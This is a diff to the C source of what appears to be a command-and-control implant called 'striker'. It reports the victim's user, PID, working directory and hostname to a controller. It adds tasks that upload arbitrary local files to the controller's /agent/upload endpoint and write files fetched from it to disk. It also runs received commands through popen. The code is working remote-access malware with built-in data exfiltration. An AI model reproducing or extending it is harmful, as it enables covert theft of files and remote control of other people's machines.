@@ -94,9 +94,27 @@ size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff){
   return chunk_size; // This tells curl that we received all bytes.
 }
 
+size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo){
+  return fwrite(chunk, size, nmemb, wfo);
+}
+
 cJSON *sysinfo(){
 
-  cJSON *info = cJSON_Parse("{\"user\":\"agent47\", \"host\":\"debian\", \"os\":\"linux\"}");
+  cJSON *info = cJSON_CreateObject();
+  char *user = getenv("USER");
+  unsigned short pid = getpid();
+  char *cwd = malloc(PATH_MAX);
+  getcwd(cwd, PATH_MAX);
+  char *os = "linux";
+  char *host = malloc(100);
+  gethostname(host, 99);
+  cJSON_AddItemToObject(info, "user", cJSON_CreateString(user));
+  cJSON_AddItemToObject(info, "pid", cJSON_CreateNumber(pid));
+  cJSON_AddItemToObject(info, "cwd", cJSON_CreateString(cwd));
+  cJSON_AddItemToObject(info, "os", cJSON_CreateString(os));
+  cJSON_AddItemToObject(info, "host", cJSON_CreateString(host));
+  free(cwd);
+  free(host);
   return info;
 }
 
@@ -109,6 +127,56 @@ task *parse_task(cJSON *json){
   t->completed = 0;
   t->result = NULL;
   return t;
+}
+
+short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff){
+
+  CURL *curl = curl_easy_init();
+  if (!curl)
+    return 0;
+  CURLcode res;
+  curl_mime *form;
+  curl_mimepart *field;
+  buffer *body = create_buffer(0);
+  curl_easy_setopt(curl, CURLOPT_URL, url);
+  form = curl_mime_init(curl);
+  field = curl_mime_addpart(form);
+  curl_mime_name(field, "file");
+  curl_mime_filedata(field, filename);
+  field = curl_mime_addpart(form);
+  curl_mime_name(field, "filename");
+  curl_mime_data(field, filename, CURL_ZERO_TERMINATED);
+  curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
+  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
+  curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
+  res = curl_easy_perform(curl);
+  free_buffer(body);
+  curl_mime_free(form);
+  curl_easy_cleanup(curl);
+  if (res != CURLE_OK){
+    buffer_strcpy(result_buff, curl_easy_strerror(res));
+    return 0;
+  }
+  return 1;
+}
+
+short int download_file(char *url, FILE *wfo, buffer *result_buff){
+
+  CURL *curl = curl_easy_init();
+  if (!curl)
+    return 0;
+  CURLcode res;
+  curl_easy_setopt(curl, CURLOPT_URL, url);
+  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
+  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_downloader);
+  curl_easy_setopt(curl, CURLOPT_WRITEDATA, wfo);
+  res = curl_easy_perform(curl);
+  if (res != CURLE_OK){
+    buffer_strcpy(result_buff, curl_easy_strerror(res));
+    return 0;
+  }
+  buffer_strcpy(result_buff, "File uploaded successfully!");
+  return 1;
 }
 
 void execute_task(session *striker, task *tsk){
@@ -137,47 +205,43 @@ void execute_task(session *striker, task *tsk){
       append_buffer(result_buff, tmp, strlen(tmp));
     }
     pclose(proc);
-  }else if (!strcmp(tsk->type, "download")){
-    char *url, *filename;
-    buffer *body;
-    FILE *rfo;
-    CURL *curl;
-    CURLcode res;
-    curl_mime *form;
-    curl_mimepart *field;
-    curl = curl_easy_init();
-    if (!curl)
-      goto complete;
-    url = malloc(URL_SIZE);
-    if (snprintf(url, URL_SIZE, "%s/agent/upload/%s/%s", baseURL, striker->uid, tsk->uid) < 0)
-      abort();
-    filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "file"));
-    if (!filename)
-      goto complete;
-    rfo = fopen(filename, "r");
+  }else if (!strcmp(tsk->type, "download")){ // Upload a file to the server.
+    char *filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "file"));
+    FILE *rfo = fopen(filename, "r");
     if (!rfo){
-      buffer_strcpy(result_buff, "Unable to open file!");
+      buffer_strcpy(result_buff, "Error opening file!");
       goto complete;
     }
+    char *url = malloc(URL_SIZE);
+    if (snprintf(url, URL_SIZE, "%s/agent/upload/%s", baseURL, striker->uid) < 0)
+      abort();
+    upload_file(url, filename, rfo, result_buff);
     fclose(rfo);
-    body = create_buffer(0);
-    curl_easy_setopt(curl, CURLOPT_URL, url);
-    form = curl_mime_init(curl);
-    field = curl_mime_addpart(form);
-    curl_mime_name(field, "file");
-    curl_mime_filedata(field, filename);
-    field = curl_mime_addpart(form);
-    curl_mime_name(field, "filename");
-    curl_mime_data(field, filename, CURL_ZERO_TERMINATED);
-    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
-    res = curl_easy_perform(curl);
-    free_buffer(body);
-    curl_mime_free(form);
-    curl_easy_cleanup(curl);
-    if (res != CURLE_OK)
-      buffer_strcpy(result_buff, curl_easy_strerror(res));
+    free(url);
+  }else if (!strcmp(tsk->type, "upload")){ // Download a file from the server.
+    char *fileID = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "fileID"));
+    char *name = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "name"));
+    char *url = malloc(URL_SIZE);
+    if (snprintf(url, URL_SIZE, "%s/agent/download/%s", baseURL, fileID) < 0)
+      abort();
+    char *loc = malloc(PATH_MAX);
+    if (snprintf(loc, PATH_MAX, "%s%s", striker->write_dir, name) < 0)
+      abort();
+    FILE *wfo = fopen(loc, "w");
+    if (wfo != NULL)
+      download_file(url, wfo, result_buff);
+    fclose(wfo);
+    free(url);
+    free(loc);
+  }else if (!strcmp(tsk->type, "writedir")){
+    char *dir = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, "dir"));
+    int len = strlen(dir);
+    if (dir[len - 1] != '/'){
+      dir[len] = '/';
+      dir[len + 1] = '\0';
+    }
+    strncpy(striker->write_dir, dir, PATH_MAX);
+    buffer_strcpy(result_buff, "Changed write directory");
   }else{
     buffer_strcpy(result_buff, "Not implemented!");
   }
@@ -199,6 +263,8 @@ void start_session(){
   session *striker = malloc(sizeof(session));
   striker->uid = malloc(sizeof(char) * 32);
   striker->delay = 5;
+  striker->write_dir = malloc(PATH_MAX);
+  strncpy(striker->write_dir, "/tmp", PATH_MAX);
 
   CURL *curl;
   CURLcode res;
@@ -294,6 +360,14 @@ void start_session(){
     curl_slist_free_all(get_headers);
     curl_slist_free_all(post_headers);
     free_buffer(body);
+    cleanup_session(striker);
+}
+
+void cleanup_session(session *striker){
+
+  free(striker->uid);
+  free(striker->write_dir);
+  free(striker);
 }
 
 int main(int argc, char **argv){
